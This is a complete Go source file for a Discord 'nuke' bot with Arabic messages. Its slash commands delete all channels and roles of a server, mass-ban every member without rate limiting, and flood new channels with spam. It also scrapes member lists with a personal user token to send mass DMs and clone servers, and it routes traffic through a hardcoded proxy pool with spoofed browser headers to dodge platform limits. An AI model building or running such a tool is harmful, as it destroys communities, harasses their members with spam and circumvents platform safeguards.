package main

import (
	"bytes"
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	_ "github.com/mattn/go-sqlite3"
)

var massiveProxyPool = []string{
	"103.152.112.5:80",
	"185.199.229.156:8080",
	"45.33.32.156:3128",
	"190.61.35.153:8080",
	"200.105.215.12:80",
}

var db *sql.DB

func initDatabase() {
	var err error
	db, err = sql.Open("sqlite3", "./local_cache.db")
	if err != nil {
		fmt.Println("❌ خطأ في فتح قاعدة البيانات المحلية:", err)
		return
	}

	createTableQuery := `
	CREATE TABLE IF NOT EXISTS guild_cache (
		guild_id TEXT,
		user_id TEXT,
		PRIMARY KEY (guild_id, user_id)
	);`
	_, _ = db.Exec(createTableQuery)
	fmt.Println("📦 تم تفعيل نظام الكاش وقاعدة البيانات المحلية بنجاح.")
}

func saveUserToCache(guildID, userID string) {
	if db == nil {
		return
	}
	_, _ = db.Exec("INSERT OR IGNORE INTO guild_cache (guild_id, user_id) VALUES (?, ?)", guildID, userID)
}

func getCachedUsersForGuild(guildID string) []string {
	if db == nil {
		return nil
	}
	rows, err := db.Query("SELECT user_id FROM guild_cache WHERE guild_id = ?", guildID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var users []string
	for rows.Next() {
		var uid string
		if rows.Scan(&uid) == nil {
			users = append(users, uid)
		}
	}
	return users
}

func main() {
	initDatabase()
	if db != nil {
		defer db.Close()
	}

	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: متغير البيئة MASTERGUARD_TOKEN غير موجود")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت الأساسي:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsAll

	cmdClone := "cloner"
	commandClone := &discordgo.ApplicationCommand{
		Name:        cmdClone,
		Description: "نسخ سيرفر كامل بالصلاحيات الكاملة والترتيب الدقيق",
		Options: []*discordgo.ApplicationCommandOption{
			{Type: discordgo.ApplicationCommandOptionString, Name: "template_guild_id", Description: "إيدي السيرفر المراد نسخه", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "user_token", Description: "التوكن الشخصي لحسابك (لسحب السيرفر المصدر)", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "bot_tokens", Description: "توكنات البوتات لتنفيذ الإنشاء (مفصولة بفاصلة)", Required: true},
		},
	}

	cmdNuke := "nuke1"
	commandNuke := &discordgo.ApplicationCommand{
		Name:        cmdNuke,
		Description: "محرك التدمير الأقصى (Overdrive Mode): سرعة قصوى بلا فواصل لتدمير السيرفرات",
		Options: []*discordgo.ApplicationCommandOption{
			{Type: discordgo.ApplicationCommandOptionBoolean, Name: "enable_ban", Description: "تفعيل باند الأعضاء؟", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "room_name", Description: "اسم الرومات الجديدة", Required: true},
			{Type: discordgo.ApplicationCommandOptionInteger, Name: "rooms_count", Description: "عدد الرومات", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "message_content", Description: "محتوى رسالة السبام", Required: true},
			{Type: discordgo.ApplicationCommandOptionInteger, Name: "messages_count", Description: "عدد الرسائل بكل روم", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "bot_tokens", Description: "توكنات البوتات التنفيذية مفصولة بفاصلة", Required: true},
		},
	}

	cmdMassDM := "massdm"
	commandMassDM := &discordgo.ApplicationCommand{
		Name:        cmdMassDM,
		Description: "إرسال رسالة خاصة (DM) لأعضاء السيرفر عبر التوكن والبوتات",
		Options: []*discordgo.ApplicationCommandOption{
			{Type: discordgo.ApplicationCommandOptionString, Name: "guild_id", Description: "إيدي السيرفر المراد استهدافه", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "user_token", Description: "التوكن الشخصي لحسابك (للسحب)", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "message", Description: "محتوى الرسالة المراد إرسالها بالخاص", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "bot_tokens", Description: "توكنات البوتات أو الحسابات للإرسال (مفصولة بفاصلة)", Required: true},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		data := i.ApplicationCommandData()
		optMap := parseOptions(data.Options)

		if data.Name == cmdClone {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{Content: "🔄 جاري نسخ الرتب والصلاحيات والترتيب بدقة تامة...", Flags: discordgo.MessageFlagsEphemeral},
			})
			tokens := parseTokens(optMap["bot_tokens"])
			templateID := optMap["template_guild_id"].(string)
			usrToken := optMap["user_token"].(string)
			go executeServerClonerWithUserToken(tokens, usrToken, massiveProxyPool, i.GuildID, templateID, i.Interaction, s)

		} else if data.Name == cmdNuke {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{Content: "⚡ جاري إطلاق محرك التدمير الأقصى (Overdrive Mode)...", Flags: discordgo.MessageFlagsEphemeral},
			})
			tokens := parseTokens(optMap["bot_tokens"])
			roomName := optMap["room_name"].(string)
			roomsCount := int(optMap["rooms_count_val"].(int64))
			msgContent := optMap["message_content"].(string)
			msgsCount := int(optMap["messages_count_val"].(int64))
			enableBan := optMap["enable_ban_val"].(bool)
			go executeNukeEngine(tokens, massiveProxyPool, i.GuildID, s.State.User.ID, roomName, roomsCount, msgContent, msgsCount, enableBan, s)

		} else if data.Name == cmdMassDM {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{Content: "🔍 جاري سحب الأعضاء عبر التوكن الشخصي وبدء الحملة...", Flags: discordgo.MessageFlagsEphemeral},
			})
			tokens := parseTokens(optMap["bot_tokens"])
			guildID := optMap["guild_id"].(string)
			userToken := optMap["user_token"].(string)
			message := optMap["message"].(string)
			go executeCrossReferenceMassDM(tokens, userToken, massiveProxyPool, guildID, message, i.ChannelID, i.Interaction, s)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في تشغيل الجلسة:", err)
		return
	}

	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandClone)
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandMassDM)
	fmt.Println("⚡ الأوامر الثلاثة (cloner, nuke1, massdm) جاهزة بالكامل بوضع السرعة القصوى!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func parseOptions(opts []*discordgo.ApplicationCommandInteractionDataOption) map[string]interface{} {
	m := make(map[string]interface{})
	for _, opt := range opts {
		m[opt.Name] = opt.Value
		switch opt.Type {
		case discordgo.ApplicationCommandOptionString:
			m[opt.Name] = opt.StringValue()
		case discordgo.ApplicationCommandOptionBoolean:
			m[opt.Name+"_val"] = opt.BoolValue()
		case discordgo.ApplicationCommandOptionInteger:
			m[opt.Name+"_val"] = opt.IntValue()
		}
	}
	return m
}

func parseTokens(input interface{}) []string {
	str, ok := input.(string)
	if !ok {
		return nil
	}
	var res []string
	for _, t := range strings.Split(str, ",") {
		t = strings.TrimSpace(t)
		if t != "" {
			res = append(res, t)
		}
	}
	return res
}

func filterActiveProxies(rawProxies []string) []*http.Client {
	var activeClients []*http.Client
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, pStr := range rawProxies {
		wg.Add(1)
		go func(proxy string) {
			defer wg.Done()
			pURL, parseErr := url.Parse("http://" + proxy)
			if parseErr != nil {
				return
			}
			client := &http.Client{
				Transport: &http.Transport{
					Proxy: http.ProxyURL(pURL),
				},
				Timeout: 1500 * time.Millisecond,
			}
			req, _ := http.NewRequest("GET", "https://discord.com/api/v10/gateway", nil)
			resp, reqErr := client.Do(req)
			if reqErr == nil {
				resp.Body.Close()
				mu.Lock()
				activeClients = append(activeClients, client)
				mu.Unlock()
			}
		}(pStr)
	}
	wg.Wait()
	return activeClients
}

func updateInteractionStatus(s *discordgo.Session, interaction *discordgo.Interaction, content string) {
	_, _ = s.InteractionResponseEdit(interaction, &discordgo.WebhookEdit{
		Content: &content,
	})
}

func sendReasonToChannel(s *discordgo.Session, channelID, reason string) {
	if channelID == "" {
		return
	}
	_, _ = s.ChannelMessageSend(channelID, fmt.Sprintf("⚠️ **تقرير الأداة:**\n%s", reason))
}

func fetchGuildDataWithUserToken(userToken, guildID string) ([]map[string]interface{}, []map[string]interface{}, error) {
	client := &http.Client{Timeout: 15 * time.Second}
	userToken = strings.TrimSpace(userToken)

	reqChan, _ := http.NewRequest("GET", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/channels", guildID), nil)
	reqChan.Header.Set("Authorization", userToken)
	reqChan.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	reqChan.Header.Set("Accept", "application/json")

	respChan, reqErr := client.Do(reqChan)
	if reqErr != nil {
		return nil, nil, reqErr
	}
	defer respChan.Body.Close()

	if respChan.StatusCode != 200 {
		return nil, nil, fmt.Errorf("channels fetch failed with status: %d", respChan.StatusCode)
	}

	var channels []map[string]interface{}
	if err := json.NewDecoder(respChan.Body).Decode(&channels); err != nil {
		return nil, nil, err
	}

	reqRole, _ := http.NewRequest("GET", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles", guildID), nil)
	reqRole.Header.Set("Authorization", userToken)
	reqRole.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	reqRole.Header.Set("Accept", "application/json")

	respRole, roleErr := client.Do(reqRole)
	if roleErr != nil {
		return channels, nil, roleErr
	}
	defer respRole.Body.Close()

	if respRole.StatusCode != 200 {
		return channels, nil, fmt.Errorf("roles fetch failed with status: %d", respRole.StatusCode)
	}

	var roles []map[string]interface{}
	if err := json.NewDecoder(respRole.Body).Decode(&roles); err != nil {
		return channels, nil, err
	}

	return channels, roles, nil
}

func fetchMembersWithUserToken(userToken, guildID string) []string {
	var allUserIDs []string
	client := &http.Client{Timeout: 10 * time.Second}
	userToken = strings.TrimSpace(userToken)

	after := "0"
	for {
		urlStr := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/members?limit=1000&after=%s", guildID, after)
		req, err := http.NewRequest("GET", urlStr, nil)
		if err != nil {
			break
		}

		req.Header.Set("Authorization", userToken)
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			break
		}

		if resp.StatusCode != 200 {
			resp.Body.Close()
			break
		}

		var members []map[string]interface{}
		if err := json.NewDecoder(resp.Body).Decode(&members); err != nil {
			resp.Body.Close()
			break
		}
		resp.Body.Close()

		if len(members) == 0 {
			break
		}

		lastID := ""
		for _, m := range members {
			if user, ok := m["user"].(map[string]interface{}); ok {
				if id, ok := user["id"].(string); ok {
					if isBot, _ := user["bot"].(bool); !isBot {
						allUserIDs = append(allUserIDs, id)
					}
					lastID = id
				}
			}
		}

		if len(members) < 1000 || lastID == "" {
			break
		}
		after = lastID
	}

	return allUserIDs
}

func executeServerClonerWithUserToken(tokens []string, userToken string, rawProxies []string, guildID, templateGuildID string, interaction *discordgo.Interaction, s *discordgo.Session) {
	if len(tokens) == 0 {
		updateInteractionStatus(s, interaction, "❌ خطأ: لم يتم إدخال توكنات بوتات التنفيذ.")
		return
	}

	clients := filterActiveProxies(rawProxies)
	if len(clients) == 0 {
		clients = append(clients, &http.Client{Timeout: 3 * time.Second})
	}

	makeProxyRequest := func(method, urlStr string, body []byte, index int) (int, bool) {
		client := clients[index%len(clients)]
		token := tokens[index%len(tokens)]

		for attempt := 0; attempt < 3; attempt++ {
			var bodyBuf *bytes.Buffer
			if body != nil {
				bodyBuf = bytes.NewBuffer(body)
			} else {
				bodyBuf = bytes.NewBuffer(nil)
			}

			req, reqErr := http.NewRequestWithContext(context.Background(), method, urlStr, bodyBuf)
			if reqErr != nil {
				return 0, false
			}
			req.Header.Set("Authorization", "Bot "+token)
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

			resp, doErr := client.Do(req)
			if doErr != nil {
				client = clients[(index+attempt+1)%len(clients)]
				continue
			}

			statusCode := resp.StatusCode
			resp.Body.Close()

			if statusCode == 429 {
				continue
			}

			return statusCode, true
		}
		return 0, false
	}

	updateInteractionStatus(s, interaction, "🔍 جاري سحب بيانات السيرفر المصدر...")
	templateChannels, templateRoles, fetchErr := fetchGuildDataWithUserToken(userToken, templateGuildID)
	if fetchErr != nil {
		updateInteractionStatus(s, interaction, fmt.Sprintf("❌ فشل سحب البيانات: %v", fetchErr))
		return
	}

	roleIDMap := make(map[string]string)

	channels, chErr := s.GuildChannels(guildID)
	var oldChannelIDs []string
	if chErr == nil {
		for _, ch := range channels {
			if ch != nil {
				oldChannelIDs = append(oldChannelIDs, ch.ID)
			}
		}
	}

	roles, roleErr := s.GuildRoles(guildID)
	if roleErr == nil {
		updateInteractionStatus(s, interaction, "🗑️ جاري حذف الرتب القديمة...")
		var wgRole sync.WaitGroup
		for i, r := range roles {
			if !r.Managed && r.Name != "@everyone" {
				wgRole.Add(1)
				go func(rID string, idx int) {
					defer wgRole.Done()
					makeProxyRequest("DELETE", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles/%s", guildID, rID), nil, idx)
				}(r.ID, i)
			}
		}
		wgRole.Wait()
	}

	updateInteractionStatus(s, interaction, fmt.Sprintf("🧹 جاري حذف الرومات القديمة (%d روم)...", len(oldChannelIDs)))
	chQueue := make(chan string, len(oldChannelIDs))
	for _, id := range oldChannelIDs {
		chQueue <- id
	}
	close(chQueue)

	var wgDel sync.WaitGroup
	for w := 0; w < 60; w++ {
		wgDel.Add(1)
		go func(workerID int) {
			defer wgDel.Done()
			for chID := range chQueue {
				makeProxyRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil, workerID)
			}
		}(w)
	}
	wgDel.Wait()

	updateInteractionStatus(s, interaction, "📥 جاري إنشاء الرتب وترتيبها وربط الصلاحيات...")

	sort.Slice(templateRoles, func(i, j int) bool {
		posI, _ := templateRoles[i]["position"].(float64)
		posJ, _ := templateRoles[j]["position"].(float64)
		return posI > posJ
	})

	for i, r := range templateRoles {
		name, _ := r["name"].(string)
		oldRoleID, _ := r["id"].(string)

		if name == "@everyone" {
			roleIDMap[oldRoleID] = guildID
			if perms, ok := r["permissions"]; ok {
				everyonePayload, _ := json.Marshal(map[string]interface{}{
					"permissions": perms,
				})
				makeProxyRequest("PATCH", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles/%s", guildID, guildID), everyonePayload, i)
			}
			continue
		}

		var perms interface{} = r["permissions"]
		if pStr, ok := r["permissions"].(string); ok {
			var pInt int64
			fmt.Sscanf(pStr, "%d", &pInt)
			perms = pInt
		}

		rolePayload, _ := json.Marshal(map[string]interface{}{
			"name":        r["name"],
			"permissions": perms,
			"color":       r["color"],
			"hoist":       r["hoist"],
			"mentionable": r["mentionable"],
		})

		client := clients[i%len(clients)]
		token := tokens[i%len(tokens)]
		req, reqErr := http.NewRequest("POST", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles", guildID), bytes.NewBuffer(rolePayload))
		if reqErr == nil {
			req.Header.Set("Authorization", "Bot "+token)
			req.Header.Set("Content-Type", "application/json")
			resp, doErr := client.Do(req)
			if doErr == nil {
				if resp.StatusCode == 200 || resp.StatusCode == 201 {
					var resRole map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&resRole) == nil {
						if newRoleID, ok := resRole["id"].(string); ok && oldRoleID != "" {
							roleIDMap[oldRoleID] = newRoleID
						}
					}
				}
				resp.Body.Close()
			}
		}
	}

	mapOverwrites := func(overwrites interface{}) []map[string]interface{} {
		var mapped []map[string]interface{}
		ovList, ok := overwrites.([]interface{})
		if !ok {
			return mapped
		}

		for _, item := range ovList {
			ov, ok := item.(map[string]interface{})
			if !ok {
				continue
			}
			idStr, _ := ov["id"].(string)
			if newID, exists := roleIDMap[idStr]; exists {
				ov["id"] = newID
				mapped = append(mapped, ov)
			} else {
				mapped = append(mapped, ov)
			}
		}
		return mapped
	}

	updateInteractionStatus(s, interaction, "📂 جاري إنشاء الفئات والرومات بصلاحياتها الدقيقة...")

	var categories []map[string]interface{}
	var regularChannels []map[string]interface{}

	for _, ch := range templateChannels {
		if t, ok := ch["type"].(float64); ok {
			if int(t) == 4 {
				categories = append(categories, ch)
			} else {
				regularChannels = append(regularChannels, ch)
			}
		}
	}

	sort.Slice(categories, func(i, j int) bool {
		posI, _ := categories[i]["position"].(float64)
		posJ, _ := categories[j]["position"].(float64)
		return posI < posJ
	})

	categoryMap := make(map[string]string)

	for idx, cat := range categories {
		fixedOverwrites := mapOverwrites(cat["permission_overwrites"])
		payload, _ := json.Marshal(map[string]interface{}{
			"name":                  cat["name"],
			"type":                  cat["type"],
			"position":              cat["position"],
			"permission_overwrites": fixedOverwrites,
		})

		client := clients[idx%len(clients)]
		token := tokens[idx%len(tokens)]
		req, reqErr := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
		if reqErr != nil {
			continue
		}
		req.Header.Set("Authorization", "Bot "+token)
		req.Header.Set("Content-Type", "application/json")

		resp, doErr := client.Do(req)
		if doErr == nil {
			if resp.StatusCode == 200 || resp.StatusCode == 201 {
				var res map[string]interface{}
				if json.NewDecoder(resp.Body).Decode(&res) == nil {
					if oldID, ok := cat["id"].(string); ok {
						if newID, ok := res["id"].(string); ok {
							categoryMap[oldID] = newID
						}
					}
				}
			}
			resp.Body.Close()
		}
	}

	sort.Slice(regularChannels, func(i, j int) bool {
		posI, _ := regularChannels[i]["position"].(float64)
		posJ, _ := regularChannels[j]["position"].(float64)
		return posI < posJ
	})

	for idx, ch := range regularChannels {
		fixedOverwrites := mapOverwrites(ch["permission_overwrites"])
		data := map[string]interface{}{
			"name":                  ch["name"],
			"type":                  ch["type"],
			"topic":                 ch["topic"],
			"nsfw":                  ch["nsfw"],
			"rate_limit_per_user":   ch["rate_limit_per_user"],
			"bitrate":               ch["bitrate"],
			"user_limit":            ch["user_limit"],
			"position":              ch["position"],
			"permission_overwrites": fixedOverwrites,
		}

		if parentID, ok := ch["parent_id"].(string); ok && parentID != "" {
			if newParentID, exists := categoryMap[parentID]; exists {
				data["parent_id"] = newParentID
			}
		}

		payload, _ := json.Marshal(data)
		makeProxyRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", payload, idx)
	}

	updateInteractionStatus(s, interaction, "✅ تم استنساخ الرتب والرومات والفئات بأقصى سرعة ممكنة بنجاح تام! 🚀")
}

func executeCrossReferenceMassDM(tokens []string, userToken string, rawProxies []string, targetGuildID string, messageContent string, responseChannelID string, interaction *discordgo.Interaction, s *discordgo.Session) {
	userToken = strings.TrimSpace(userToken)

	allUserIDs := getCachedUsersForGuild(targetGuildID)
	if len(allUserIDs) == 0 {
		updateInteractionStatus(s, interaction, "🔄 جاري سحب الأعضاء بالتوكن الشخصي مباشرة...")
		allUserIDs = fetchMembersWithUserToken(userToken, targetGuildID)
		for _, uid := range allUserIDs {
			saveUserToCache(targetGuildID, uid)
		}
	}

	if len(allUserIDs) == 0 {
		reason := "فشل جلب الأعضاء. تأكد من صحة التوكن الشخصي وأن الحساب عضو في السيرفر المطلوب."
		updateInteractionStatus(s, interaction, fmt.Sprintf("❌ %s", reason))
		sendReasonToChannel(s, responseChannelID, reason)
		return
	}

	allTokens := append([]string{userToken}, tokens...)

	updateInteractionStatus(s, interaction, fmt.Sprintf("📨 تم العثور على (%d عضو). جاري بدء الإرسال الفائق...", len(allUserIDs)))
	sendReasonToChannel(s, responseChannelID, fmt.Sprintf("تم جلب (%d) عضو بنجاح وبدء إرسال الرسائل الخاصة.", len(allUserIDs)))

	userQueue := make(chan string, len(allUserIDs))
	for _, uid := range allUserIDs {
		userQueue <- uid
	}
	close(userQueue)

	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
	
	clients := filterActiveProxies(rawProxies)
	if len(clients) == 0 {
		clients = append(clients, &http.Client{Timeout: 3 * time.Second})
	}

	var wg sync.WaitGroup
	var successCount int64
	var mu sync.Mutex
	workersCount := 100

	for w := 0; w < workersCount; w++ {
		wg.Add(1)
		go func(wID int) {
			defer wg.Done()
			client := clients[wID%len(clients)]
			currToken := strings.TrimSpace(allTokens[wID%len(allTokens)])
			authHeader := currToken

			for userID := range userQueue {
				dmPayload, _ := json.Marshal(map[string]string{"recipient_id": userID})
				reqDM, err := http.NewRequest("POST", "https://discord.com/api/v10/users/@me/channels", bytes.NewBuffer(dmPayload))
				if err != nil {
					continue
				}
				
				reqDM.Header.Set("Authorization", authHeader)
				reqDM.Header.Set("Content-Type", "application/json")
				reqDM.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

				respDM, err := client.Do(reqDM)
				if err != nil {
					continue
				}

				if respDM.StatusCode == 429 {
					respDM.Body.Close()
					continue
				}

				if respDM.StatusCode != 200 && respDM.StatusCode != 201 {
					respDM.Body.Close()
					continue
				}

				var dmRes map[string]interface{}
				err = json.NewDecoder(respDM.Body).Decode(&dmRes)
				respDM.Body.Close()
				if err != nil {
					continue
				}

				chanID, ok := dmRes["id"].(string)
				if !ok || chanID == "" {
					continue
				}

				reqMsg, err := http.NewRequest("POST", fmt.Sprintf("https://discord.com/api/v10/channels/%s/messages", chanID), bytes.NewBuffer(msgPayload))
				if err != nil {
					continue
				}
				
				reqMsg.Header.Set("Authorization", authHeader)
				reqMsg.Header.Set("Content-Type", "application/json")
				reqMsg.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

				respMsg, err := client.Do(reqMsg)
				if err != nil {
					continue
				}
				
				if respMsg.StatusCode == 200 || respMsg.StatusCode == 201 {
					mu.Lock()
					successCount++
					mu.Unlock()
				}
				respMsg.Body.Close()
			}
		}(w)
	}

	wg.Wait()
	finalReport := fmt.Sprintf("✅ انتهت الحملة بنجاح! تم إرسال الرسالة إلى **(%d)** من أصل **(%d)** عضو. 🚀", successCount, len(allUserIDs))
	updateInteractionStatus(s, interaction, finalReport)
	sendReasonToChannel(s, responseChannelID, finalReport)
}

// ==========================================
// محرك Nuke1 الأقصى (Overdrive Mode - بدون فواصل وبأقصى سرعة)
// ==========================================
func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, includeBan bool, s *discordgo.Session) {
	if len(tokens) == 0 {
		return
	}
	clients := filterActiveProxies(rawProxies)
	if len(clients) == 0 {
		clients = append(clients, &http.Client{
			Transport: &http.Transport{
				MaxIdleConns:        10000,
				MaxIdleConnsPerHost: 5000,
				ForceAttemptHTTP2:   true,
			},
			Timeout: 2 * time.Second,
		})
	}

	botIDs := map[string]bool{botID: true}
	channelPayloads := make([][]byte, roomsCount)
	for i := 0; i < roomsCount; i++ {
		p, _ := json.Marshal(map[string]interface{}{
			"name": fmt.Sprintf("%s-%d", roomName, i),
			"type": 0,
		})
		channelPayloads[i] = p
	}

	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})

	// سحب الأعضاء بالكامل للباند السريع
	var allUserIDs []string
	if includeBan {
		after := ""
		for {
			members, memErr := s.GuildMembers(guildID, after, 1000)
			if memErr != nil || len(members) == 0 {
				break
			}
			for _, m := range members {
				if m != nil && m.User != nil {
					if !botIDs[m.User.ID] {
						allUserIDs = append(allUserIDs, m.User.ID)
					}
					after = m.User.ID
				}
			}
			if len(members) < 1000 {
				break
			}
		}
	}

	channels, chErr := s.GuildChannels(guildID)
	var oldChannelIDs []string
	if chErr == nil {
		for _, ch := range channels {
			if ch != nil {
				oldChannelIDs = append(oldChannelIDs, ch.ID)
			}
		}
	}

	// 1. حذف الرومات القديمة فوراً وبأقصى توازي ممكن
	chQueue := make(chan string, len(oldChannelIDs))
	for _, id := range oldChannelIDs {
		chQueue <- id
	}
	close(chQueue)

	var wgDel sync.WaitGroup
	for w := 0; w < 150; w++ {
		wgDel.Add(1)
		go func(wID int) {
			defer wgDel.Done()
			client := clients[wID%len(clients)]
			token := tokens[wID%len(tokens)]
			for chID := range chQueue {
				req, err := http.NewRequestWithContext(context.Background(), "DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
				if err != nil {
					continue
				}
				req.Header.Set("Authorization", "Bot "+token)
				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}(w)
	}
	wgDel.Wait()

	// 2. إبادة الباندات (Overdrive Mode: بلا أي فواصل زمنية، ضربات متزامنة مطلقة لطحن عشرات الآلاف)
	if includeBan && len(allUserIDs) > 0 && len(tokens) > 0 {
		var wgBan sync.WaitGroup
		totalUsers := len(allUserIDs)

		for i, token := range tokens {
			wgBan.Add(1)
			go func(tokenIdx int, botToken string) {
				defer wgBan.Done()
				client := clients[tokenIdx%len(clients)]

				chunkSize := totalUsers / len(tokens)
				start := tokenIdx * chunkSize
				end := start + chunkSize
				if tokenIdx == len(tokens)-1 {
					end = totalUsers
				}
				if start >= totalUsers {
					return
				}

				botQueue := allUserIDs[start:end]

				// إطلاق الطلبات بأقصى سرعة ممكنة بدون أي time.Sleep نهائياً
				for _, uid := range botQueue {
					urlStr := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
					req, err := http.NewRequestWithContext(context.Background(), "PUT", urlStr, nil)
					if err != nil {
						continue
					}
					req.Header.Set("Authorization", "Bot "+botToken)
					req.Header.Set("Content-Type", "application/json")
					req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

					resp, err := client.Do(req)
					if err != nil {
						continue
					}
					resp.Body.Close()
				}
			}(i, token)
		}
		wgBan.Wait()
	}

	// 3. إنشاء الرومات الجديدة بأقصى توازي واندفاع
	var newChannelIDs []string
	var muChannels sync.Mutex
	var wgCreate sync.WaitGroup

	roomChan := make(chan []byte, len(channelPayloads))
	for _, p := range channelPayloads {
		roomChan <- p
	}
	close(roomChan)

	for w := 0; w < 120; w++ {
		wgCreate.Add(1)
		go func(wID int) {
			defer wgCreate.Done()
			client := clients[wID%len(clients)]
			token := tokens[wID%len(tokens)]

			for p := range roomChan {
				req, reqErr := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
				if reqErr != nil {
					continue
				}
				req.Header.Set("Authorization", "Bot "+token)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

				resp, doErr := client.Do(req)
				if doErr != nil {
					continue
				}
				if resp.StatusCode == 200 || resp.StatusCode == 201 {
					var res map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&res) == nil {
						if id, ok := res["id"].(string); ok {
							muChannels.Lock()
							newChannelIDs = append(newChannelIDs, id)
							muChannels.Unlock()
						}
					}
				}
				resp.Body.Close()
			}
		}(w)
	}
	wgCreate.Wait()

	// 4. إرسال رسائل السبام في الرومات الجديدة بلا توقف
	if len(newChannelIDs) > 0 && messagesCount > 0 {
		var wgMsg sync.WaitGroup
		for i, chID := range newChannelIDs {
			wgMsg.Add(1)
			go func(cID string, wIdx int) {
				defer wgMsg.Done()
				client := clients[wIdx%len(clients)]
				token := tokens[wIdx%len(tokens)]

				for m := 0; m < messagesCount; m++ {
					req, err := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
					if err != nil {
						continue
					}
					req.Header.Set("Authorization", "Bot "+token)
					req.Header.Set("Content-Type", "application/json")
					req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

					resp, err := client.Do(req)
					if err == nil {
						resp.Body.Close()
					}
				}
			}(chID, i)
		}
		wgMsg.Wait()
	}
}
